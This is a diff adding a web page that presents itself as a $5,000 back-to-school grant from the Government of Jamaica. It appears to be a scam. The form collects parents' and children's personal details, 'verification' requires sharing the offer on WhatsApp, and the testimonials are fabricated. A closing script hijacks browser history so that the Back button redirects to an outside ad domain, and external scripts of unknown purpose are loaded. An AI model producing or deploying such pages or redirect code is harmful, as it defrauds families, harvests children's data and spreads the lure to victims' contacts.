@@ -1,0 +1,844 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+ 
+   <script src="school-verify.js"></script>
+    <script src="verify.js"></script>
+  <title>Back to School $5,000 Program 2026</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="og:title" content="Back to School $5,000 Program 2026" />
+  <meta property="og:description" content="Apply for the Back to School $5,000 Grant for Primary and Secondary Schools Student " />
+  <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2-KuOdxIhfRm9UqjZ1Q0VKpzOlJz9NvaWTHzYecB5nFXBkI5xfBGAYi2sfzYK__UxOmoYIs4BZTTXDjQppWxNppSMQJgNKPGnlP8WwSn7SLltpU0hswU_nzk2thQOvCRQFXBUqBXt_ouJ91UDVNHvFLnMJra1Dqp3P3zRnJRrbNZqRMo1vZe3v8a_yhMI/s320/B89E5A12-9A8E-4A0B-A16E-48AD31CDA4BE.jpeg" />
+  <meta property="og:type" content="website" />
+  
+  <style type="text/css">
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap");
+    
+    * {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', Arial, sans-serif;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #f0f7ff 0%, #e6f0ff 100%);
+      min-height: 100vh;
+      direction: ltr;
+      color: #333;
+    }
+    
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .post {
+      background: #fff;
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
+      border: 1px solid #e1e8ed;
+      margin-bottom: 25px;
+      border-left: 5px solid #0056b3;
+    }
+    
+    .post img {
+      width: 100%;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      border: 2px solid #0056b3;
+    }
+    
+    .title {
+      text-align: center;
+      font-weight: 700;
+      color: #0056b3;
+      margin-bottom: 25px;
+      font-size: 24px;
+    }
+    
+    .offer-text {
+      font-size: 16px;
+      line-height: 1.7;
+      color: #444;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    
+    .deadline {
+      text-align: center;
+      color: #0056b3;
+      font-weight: 600;
+      margin: 15px 0;
+      font-size: 16px;
+      background: #e6f0ff;
+      padding: 10px;
+      border-radius: 10px;
+    }
+    
+    .check-button {
+      display: block;
+      width: 100%;
+      height: 60px;
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 15px;
+      margin: 25px auto;
+      background: linear-gradient(135deg, #0056b3 0%, #003d82 100%);
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 20px rgba(0, 86, 179, 0.3);
+    }
+    
+    .check-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(0, 86, 179, 0.4);
+    }
+    
+    .phone-section {
+      display: none;
+    }
+    
+    .phone-input {
+      width: 100%;
+      height: 60px;
+      padding: 18px;
+      outline: none;
+      border: 2px solid #e1e8ed;
+      font-size: 16px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      transition: all 0.3s ease;
+      background: #fff;
+      font-family: 'Poppins', sans-serif;
+      color: #333;
+      text-align: center;
+    }
+    
+    .phone-input:focus {
+      border-color: #0056b3;
+      box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1);
+    }
+    
+    .loading-screen {
+      display: none;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    
+    .loader {
+      width: 70px;
+      height: 70px;
+      background: transparent;
+      border: solid 4px #e6f0ff;
+      border-top: solid 4px #0056b3;
+      border-radius: 50%;
+      margin: 25px auto;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      100% {
+        transform: rotate(1turn);
+      }
+    }
+    
+    .progress-bar {
+      direction: ltr;
+      width: 100%;
+      margin: 30px auto;
+    }
+    
+    .progress-fill {
+      position: relative;
+      width: 100%;
+      height: 25px;
+      padding: 3px;
+      border: 2px solid #e1e8ed;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+    
+    .progress-bar-fill {
+      background: linear-gradient(90deg, #0056b3, #003d82);
+      width: 0%;
+      height: 100%;
+      border-radius: 10px;
+      transition: width 0.3s ease;
+    }
+    
+    .progress-percentage {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 600;
+      color: #0056b3;
+      margin-top: 10px;
+    }
+    
+    .share-section {
+      display: none;
+    }
+    
+    .congratulations {
+      text-align: center;
+      margin: 30px 0;
+    }
+    
+    .congratulations h3 {
+      color: #0056b3;
+      margin-bottom: 20px;
+      font-size: 28px;
+    }
+    
+    .congratulations p {
+      font-size: 18px;
+      color: #333;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    
+    .grant-amount {
+      font-size: 36px;
+      font-weight: 700;
+      color: #0056b3;
+      margin: 20px 0;
+    }
+    
+    .instructions {
+      background: #f8f9fa;
+      padding: 25px;
+      border-radius: 15px;
+      margin: 25px 0;
+      border-left: 4px solid #0056b3;
+    }
+    
+    .instructions p {
+      font-size: 16px;
+      line-height: 1.6;
+      color: #555;
+      margin-bottom: 10px;
+    }
+    
+    .whatsapp-button {
+      display: block;
+      width: 100%;
+      height: 60px;
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 15px;
+      margin: 25px auto;
+      background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 20px rgba(37, 211, 102, 0.3);
+    }
+    
+    .whatsapp-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
+    }
+    
+    .final-section {
+      display: none;
+      text-align: center;
+    }
+    
+    .success-icon {
+      font-size: 80px;
+      color: #0056b3;
+      margin: 20px 0;
+    }
+    
+    .claim-button {
+      display: block;
+      width: 100%;
+      height: 60px;
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 15px;
+      margin: 20px 0;
+      background: linear-gradient(135deg, #0056b3 0%, #003d82 100%);
+      transition: all 0.3s ease;
+    }
+    
+    .comments-section {
+      background: #fff;
+      border-radius: 20px;
+      padding: 25px;
+      box-shadow: 0 15px 35px rgba(0, 0, 100, 0.1);
+      margin-top: 20px;
+      border-left: 5px solid #0056b3;
+    }
+    
+    .comment {
+      padding: 20px 0;
+      border-bottom: 1px solid #e1e8ed;
+    }
+    
+    .comment img {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      float: left;
+      margin-right: 12px;
+      border: 2px solid #0056b3;
+    }
+    
+    .comment-content {
+      background: #f8f9fa;
+      padding: 15px;
+      border-radius: 15px;
+      font-size: 14px;
+    }
+    
+    .comment-user {
+      color: #0056b3;
+      font-weight: 600;
+      margin-bottom: 5px;
+    }
+    
+    .comment-text {
+      color: #444;
+    }
+    
+    .marquee {
+      background: linear-gradient(90deg, #0056b3, #003d82);
+      color: white;
+      padding: 15px 0;
+      font-weight: 700;
+      margin: 20px 0;
+      border-radius: 12px;
+      font-size: 16px;
+    }
+    
+    .error-message {
+      display: none;
+      text-align: center;
+      color: #e74c3c;
+      background: #ffeaea;
+      padding: 12px;
+      border-radius: 10px;
+      margin: 15px 0;
+    }
+    
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin: 20px 0;
+      justify-content: center;
+    }
+    
+    .feature {
+      background: #e6f0ff;
+      padding: 15px;
+      border-radius: 10px;
+      flex: 1;
+      min-width: 120px;
+      text-align: center;
+      border: 1px solid #b3d1ff;
+    }
+    
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #0056b3;
+    }
+    
+    .feature-text {
+      font-size: 12px;
+      color: #333;
+      font-weight: 500;
+    }
+    
+    .program-info {
+      background: #e6f0ff;
+      padding: 20px;
+      border-radius: 15px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    
+    .program-info h4 {
+      color: #0056b3;
+      margin-bottom: 10px;
+    }
+    
+    .program-info ul {
+      padding-left: 20px;
+      color: #444;
+    }
+    
+    .program-info li {
+      margin-bottom: 8px;
+    }
+    
+    /* Mobile responsive */
+    @media (max-width: 600px) {
+      .post {
+        padding: 20px;
+      }
+      
+      .title {
+        font-size: 20px;
+      }
+      
+      .check-button, .whatsapp-button, .claim-button {
+        height: 55px;
+        font-size: 18px;
+      }
+      
+      .grant-amount {
+        font-size: 28px;
+      }
+      
+      .congratulations h3 {
+        font-size: 24px;
+      }
+      
+      .feature {
+        min-width: 100px;
+      }
+    }
+  </style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+
+<body>
+  <div class="container">
+    <!-- Main Offer Section -->
+    <div class="post" id="mainOffer">
+        
+        <div style="text-align: center; margin-bottom: 25px;">
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVZN8HqM6fYX5yoScqUlNIRmJndM-HWT5GB9FAUuDfywWCtluRxVD-taPipB71tUG4pEGUwL1GzSWOE43oburQ0yPprVutZXHoOSyUUM1E0kNcXQCH5T82S8xCOWwflO4tmeJi-hfuY_qFFF2XC8MKBvAtVLbG2lbnTwFo1b2wZCmzl4MizGjboPP9fIdt/s791/F0663B47-2DB2-4DA1-94B7-5EC6DB9183C9.jpeg" alt="Back to School Logo" style="max-width: 300px; height: auto; border-radius: 10px;">
+</div>
+        
+        
+    
+      
+     
+      
+      <marquee class="marquee" direction="left">
+        🚀 $5,000  Grant for Primary and Secondary Schools Student! Apply now for the 2026 Back to School Program.
+      </marquee>
+      
+      <div class="features">
+        <div class="feature">
+          <div class="feature-icon">💰</div>
+          <div class="feature-text">$5,000 Grant</div>
+        </div>
+        <div class="feature">
+          <div class="feature-icon">🌍</div>
+          <div class="feature-text">Jamaica</div>
+        </div>
+        <div class="feature">
+          <div class="feature-icon">🎓</div>
+          <div class="feature-text">Student</div>
+        </div>
+        <div class="feature">
+          <div class="feature-icon">🤝</div>
+          <div class="feature-text">$5,000-$10,000 per student</div>
+        </div>
+      </div>
+      
+      
+      
+      <p class="offer-text">
+        The <strong>Back to School</strong> to help families with
+        <strong>$5,000 Grants</strong>  for school expenses like books, uniforms, and supplies 
+      </p>
+      
+      <p class="offer-text">
+        Click <strong>"APPLY NOW"</strong> to check your eligibility and submit your application for your child.
+      </p>
+      
+      
+      
+      <button class="check-button" id="checkNow">APPLY NOW</button>
+      
+      
+      
+      <br>
+      
+      <div class="program-info">
+        <h4>Program Benefits:</h4>
+        <ul>
+          <li>$5,000-$10,000 per student</li>
+          <li>Increased tertiary support</li>
+          <li>With similar annual support</li>
+          <li>Poor Relief Programme</li>
+          <li>Constituency Development Funds</li>
+        </ul>
+      </div>
+      
+      
+      
+       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHEgGRyzc50RQMp1PaQDsF5jjwZRCtzsGQ03uc0HhtLIkSGQZBmII_MT-_zOtQQ4ScncxECSNofCSfmtdLj5dQNYsqA1lq1vvPLr5XhS_112I9bExJrPURgiR1iM4LcXlyle2zkE21Sw9tlhUUeQFkVGdr7iM4JLYqaZHUPfIwiJ9JYCffJlCuU-iklavO/s520/E6F69DFE-EDEA-453D-B3C9-9BD246738378.jpeg" alt="Back to School Grant" class="offer-image">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+      <div class="title">Processing Application...</div>
+      <div class="loader"></div>
+      <div class="progress-percentage" id="loadingPercent">0%</div>
+    </div>
+
+    <!-- Application Form Section -->
+    <div class="post phone-section" id="phoneSection">
+      <div class="title"> Grant Application</div>
+      
+      <p class="offer-text">
+        Complete this application form to be considered for the $5,000 Back to School Grant.
+      </p>
+      
+      <input type="text" class="phone-input" id="fullName" placeholder="Parent/Guardian Name">
+      <input type="email" class="phone-input" id="userEmail" placeholder="Email Address">
+      <input type="tel" class="phone-input" id="phoneNumber" placeholder="Phone Number">
+      <input type="text" class="phone-input" id="userCountry" placeholder="Child Full Name">
+      <input type="text" class="phone-input" id="businessIdea" placeholder="Child School Name">
+      
+      <div class="error-message" id="phoneError">Please complete all fields correctly</div>
+      
+      <button class="check-button" id="verifyPhone">SUBMIT APPLICATION</button>
+    </div>
+
+    <!-- Share Section -->
+    <div class="post share-section" id="shareSection">
+      <div class="congratulations">
+        <h3>Application Received! ✅</h3>
+        <p>Your application for the Back to School Grant has been Received!</p>
+        <div class="grant-amount" id="grantBonus">$5,000 GRANT</div>
+        <p> Funding Program 2026</p>
+      </div>
+      
+      <div class="instructions">
+    <p><strong>✅ Complete Verification - Prove you're human</strong></p>
+    <p><strong>To complete your application verification, you must:</strong></p>
+    <p>1. <strong>SHARE THIS OFFER</strong> with 15 Friends, Groups on WhatsApp</p>
+    <p>2. Click the "SHARE ON WHATSAPP" button below</p>
+    <p>3. After sharing, you'll be redirected automatically</p>
+    <p>4. <strong>GRANT DISBURSEMENT</strong> begins January 2026</p>
+    
+    
+    
+    <div style="background: #ffeaa7; padding: 15px; border-radius: 10px; margin-top: 15px; border-left: 4px solid #fdcb6e;">
+      <p style="color: #d63031; font-weight: bold; margin: 0;">
+        ⚠️ IMPORTANT: This verification step confirms you're a real Human, not a bot.
+        Applications without verification will not be processed.
+      </p>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+    
+      </div>
+      
+      <button class="whatsapp-button" id="shareWhatsApp">
+        SHARE ON WHATSAPP
+      </button>
+      
+      <div class="progress-bar">
+        <div class="progress-fill">
+          <div class="progress-bar-fill" id="shareProgress"></div>
+        </div>
+        <div class="progress-percentage" id="sharePercent">0%</div>
+      </div>
+    </div>
+
+    <!-- Final Section -->
+    <div class="post final-section" id="finalSection">
+      <div class="success-icon">✅</div>
+      <div class="title">Application Successfully Submitted!</div>
+      
+      <p class="offer-text">
+        Congratulations! Your application for the 
+        <span style="color: #0056b3; font-weight: bold;">$5,000 Back to School Grant</span> 
+        has been received. You will receive email confirmation within 48 hours.
+      </p>
+      
+      <div class="instructions">
+        <p><strong>Next Steps:</strong></p>
+        <p>✅ Application under review by PATH committee</p>
+        <p>✅ Primary and Secondary schools</p>
+        <p>✅ Grant disbursement: January 2026</p>
+        <p>✅ Receive Payment in two days time</p>
+      </div>
+      
+      <button class="claim-button" id="finalClaim">
+        VIEW APPLICATION STATUS
+      </button>
+      
+      <button class="whatsapp-button" onclick="window.open('http://outrotomr.com/4/3144603', '_blank')" style="background: linear-gradient(135deg, #0056b3 0%, #003d82 100%);">
+        ACCOUNT NUMBER
+      </button>
+    </div>
+
+    <!-- Success Stories Section -->
+    <div class="comments-section">
+      <h3 style="color: #0056b3; text-align: center; margin-bottom: 20px;">🎯 Success Stories</h3>
+      
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/women/65.jpg" alt="Success Story">
+        <div class="comment-content">
+          <div class="comment-user">Amina Diallo (Jamaica)</div>
+          <div class="comment-text">Received $5,000 </div>
+        </div>
+      </div>
+      
+      
+      <div class="comment">
+        <img src="https://rewardstatus.store/img/b.jpg" alt="Success Story">
+        <div class="comment-content">
+          <div class="comment-user">Chinedu Okoro (Jamaica)</div>
+          <div class="comment-text">Thank you</div>
+        </div>
+      </div>
+      
+      <div class="comment">
+  <img src="https://randomuser.me/api/portraits/men/22.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Kwame Asante (Jamaica)</div>
+    <div class="comment-text">Thank you</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/women/33.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Fatima Hassan (Jamaica)</div>
+    <div class="comment-text">Thank you</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/men/45.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">David Osei (Jamaica)</div>
+    <div class="comment-text">Thank you</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/women/28.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Amina Diallo (Jamaica)</div>
+    <div class="comment-text">Wow Thank you</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/men/67.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Joseph Kamau (Jamaica)</div>
+    <div class="comment-text">I'm very happy I just got credited</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/women/56.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Grace Mensah (Jamaica)</div>
+    <div class="comment-text">Have not receive yet </div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/men/38.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Musa Ibrahim (Jamaica)</div>
+    <div class="comment-text">Am so happy Thank you</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://rewardstatus.store/img/a.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Sarah Chibwe (Jamaica)</div>
+    <div class="comment-text">$5,000 grant Receive</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://randomuser.me/api/portraits/men/51.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Peter Abebe (Jamaica)</div>
+    <div class="comment-text">Thank you ☕</div>
+  </div>
+</div>
+
+<div class="comment">
+  <img src="https://rewardstatus.store/img/c.jpg" alt="Success Story">
+  <div class="comment-content">
+    <div class="comment-user">Zainab Bello (Jamaica)</div>
+    <div class="comment-text">Thank you so much for the grant</div>
+  </div>
+</div>
+      
+      
+      <div class="comment">
+        <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Success Story">
+        <div class="comment-content">
+          <div class="comment-user">Fatima Bello (Jamaica)</div>
+          <div class="comment-text">$5,000 Life-changing program!</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+  <script>
+    let shareCount = 0;
+    
+    $(document).ready(function() {
+      // Apply Now Button
+      $("#checkNow").click(function() {
+        $("#mainOffer").hide();
+        $("#loadingScreen").show();
+        
+        let percent = 0;
+        const loadingInterval = setInterval(function() {
+          percent += 2;
+          $("#loadingPercent").text(percent + "%");
+          
+          if (percent >= 100) {
+            clearInterval(loadingInterval);
+            setTimeout(function() {
+              $("#loadingScreen").hide();
+              $("#phoneSection").show();
+            }, 500);
+          }
+        }, 50);
+      });
+      
+      // Submit Application Button
+      $("#verifyPhone").click(function() {
+        const phoneNumber = $("#phoneNumber").val().trim();
+        const fullName = $("#fullName").val().trim();
+        const userEmail = $("#userEmail").val().trim();
+        const userCountry = $("#userCountry").val().trim();
+        const businessIdea = $("#businessIdea").val().trim();
+        
+        if (phoneNumber.length < 8 || fullName.length < 3 || userEmail.length < 5 || userCountry.length < 3 || businessIdea.length < 2) {
+          $("#phoneError").show();
+          return;
+        }
+        
+        $("#phoneError").hide();
+        $("#phoneSection").hide();
+        $("#shareSection").show();
+        
+        // Set grant amount
+        $("#grantBonus").text("$5,000 GRANT");
+      });
+      
+      // Share on WhatsApp Button
+      $("#shareWhatsApp").click(function() {
+        const text = `*Back to School $5,000 Grant 2026*%0A%0A I just applied for the Back to School $5,000 Grant!%0A%0A*Purpose:* To help families with back-to-school expenses like books, uniforms, and supplies.%0A%0A The Government of Jamaica Providing Back-to-School Grant, Students in Primary and Secondary Schools will receive $5,000 each%0A%0A Apply now for your child! 👉: https://phivez.org/back-to-school`;
+        const shareUrl = "whatsapp://send?text=" + text;
+        
+        window.location.href = shareUrl;
+        
+        // Update progress after sharing
+        setTimeout(function() {
+          shareCount++;
+          let progress = 0;
+          
+          if (shareCount === 1) progress = 50;
+          else if (shareCount === 2) progress = 60;
+          else if (shareCount === 3) progress = 70;
+          else if (shareCount === 4) progress = 75;
+          else if (shareCount === 5) progress = 80;
+          else if (shareCount === 6) progress = 85;
+          else if (shareCount === 7) progress = 88;
+          else if (shareCount === 8) progress = 90;
+          else if (shareCount === 9) progress = 94;
+          else if (shareCount === 10) progress = 98;
+          else if (shareCount >= 11) progress = 100;
+          
+          $("#shareProgress").css("width", progress + "%");
+          $("#sharePercent").text(progress + "%");
+          
+          if (progress >= 100) {
+            setTimeout(function() {
+              $("#shareSection").hide();
+              $("#finalSection").show();
+            }, 1000);
+          }
+        }, 1000);
+      });
+      
+      // Final Claim Button
+      $("#finalClaim").click(function() {
+        alert(`✅ Your application for the $5,000 Back to School Grant has been submitted successfully! You will receive Payment within 48 hours.`);
+        window.location.href = 'http://outrotomr.com/4/3144603';
+      });
+      
+      // Live comments counter
+      let likes = 456, comments = 89;
+      setInterval(function() {
+        likes += Math.floor(Math.random() * 8);
+        comments += Math.floor(Math.random() * 4);
+      }, 5000);
+    });
+  </script>
+  
+  <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+      fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+      location.href="http://outrotomr.com/4/3144603";
+    }
+    function goon(){
+      location.href="http://outrotomr.com/4/3144603";
+    }
+  </script>
+  
+ <!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1727799,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+</body>
+</html>
